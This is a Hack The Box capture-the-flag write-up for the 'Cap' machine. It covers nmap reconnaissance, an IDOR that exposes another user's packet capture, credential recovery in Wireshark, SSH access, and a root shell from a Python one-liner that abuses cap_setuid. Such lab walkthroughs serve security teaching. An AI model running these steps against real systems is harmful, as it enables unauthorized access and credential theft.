# Cap — Hack The Box Writeup

## Overview

**Target:** Cap  
**IP:** `10.10.10.245`  
**Difficulty:** Easy  
**OS:** Linux  

---

# Reconnaissance

## Nmap Scan

```bash
nmap -sC -sV 10.10.10.245
```

## Output

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

## Initial Observations

- FTP service available
- SSH service exposed but requires credentials
- Web application running on port `80`

Since SSH required authentication, web enumeration became the priority.

---

# Web Enumeration

Visited:

```text
http://10.10.10.245
```

The application loaded a security dashboard and automatically logged us in as user:

```text
nathan
```

While navigating through the dashboard, packet capture files (`.pcap`) were visible.

This immediately stood out because network captures often contain sensitive information.

---

# IDOR Vulnerability Discovery

Observed URLs like:

```text
http://10.10.10.245/data/1
```

Testing parameter manipulation revealed an **IDOR vulnerability**.

Modified request:

```text
http://10.10.10.245/data/0
```

This exposed another user's packet capture file.

---

## Why this worked

The application failed to properly validate authorization checks for requested resources.

This allowed access to files belonging to other users.

**Vulnerability:**
- Insecure Direct Object Reference (IDOR)

---

# Packet Analysis

Downloaded the `.pcap` file and opened it using Wireshark.

```bash
wireshark capture.pcap
```

While analyzing HTTP traffic, plaintext credentials were discovered.

Recovered credentials:

```text
Username: nathan
Password: [REDACTED]
```

---

# Initial Access

Used the credentials to authenticate via SSH.

```bash
ssh nathan@10.10.10.245
```

Access successful.

Obtained a user shell.

---

# User Flag

Located and retrieved the user flag.

```bash
cat user.txt
```

---

# Privilege Escalation Enumeration

Checked Linux capabilities on system binaries.

```bash
getcap -r / 2>/dev/null
```

Found:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

This was the key privilege escalation vector.

---

# Exploiting Python Capabilities

Since Python had `cap_setuid`, it could elevate privileges without sudo access.

Executed:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Successfully spawned a root shell.

---

# Root Flag

Retrieved root flag.

```bash
cat /root/root.txt
```

---

# Attack Chain Summary

```text
Nmap Scan
→ Web Enumeration
→ IDOR Discovery
→ PCAP Download
→ Credential Harvesting
→ SSH Access
→ Capability Enumeration
→ Python Privilege Escalation
→ Root Shell
```

---

# Lessons Learned

### Always test numeric parameters

Simple parameter manipulation can expose sensitive data.

### Packet captures are gold mines

PCAP files frequently reveal credentials, internal hosts, and sensitive traffic.

### Linux capabilities matter

Many people check sudo permissions but forget capabilities.

```bash
getcap -r / 2>/dev/null
```

Should always be part of your enumeration checklist.

### Plaintext authentication is dangerous

Credentials transmitted over HTTP are easily captured.

---

# Final Thoughts

This was a beginner-friendly machine but teaches important real-world concepts:

- IDOR vulnerabilities
- Network traffic analysis
- Credential harvesting
- Linux capability abuse

A very clean box for learning enumeration discipline and basic privilege escalation.
